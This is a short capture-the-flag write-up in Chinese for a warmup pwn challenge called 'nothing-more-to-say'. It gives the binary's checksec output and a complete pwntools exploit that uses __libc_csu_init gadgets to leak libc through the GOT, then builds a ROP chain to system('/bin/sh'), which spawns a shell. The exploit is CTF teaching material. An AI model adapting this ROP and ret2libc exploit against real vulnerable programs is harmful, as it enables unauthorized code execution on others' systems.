## Pwn

### nothing-more-to-say

```
// file
./warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5fc8df188af9d5e2ab28765b036bba276bb1def9, not stripped

// checksec
[*] '/home/u1f383/tmp/pwn/pwn/nothing-more-to-say/warmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```



因為是 warmup，所以任何保護機制都沒開，這邊用的是 `__libc_csu_init` 作為練習，exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./warmup')
gdb.attach(r, """
b *0x400709
c
""")

put_got = 0x601018
get_got = 0x601030
leave_ret = 0x400708
buf = 0x601800

rop = flat(
    0x40076a,
    0, 1, put_got, put_got, 0, 0, 0x400750,
    0xdeadbeef, 0, 1, get_got, buf, 0, 0, 0x400750,
    1, 2, buf - 8, 4, 5, 6, 7, leave_ret,
)

pl = b"\x00" * 0x108 + rop

r.sendlineafter("Please pwn me :)\n", pl)
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x875a0
pop_rdi_ret = libc + 0x26b72
_system = libc + 0x55410
binsh = libc + 0x1b75aa
info(f"""
libc: {hex(libc)}
""")

pl2 = p64(pop_rdi_ret) + p64(binsh) + p64(_system)
sleep(0.1)
r.sendline(pl2)

r.interactive()
```

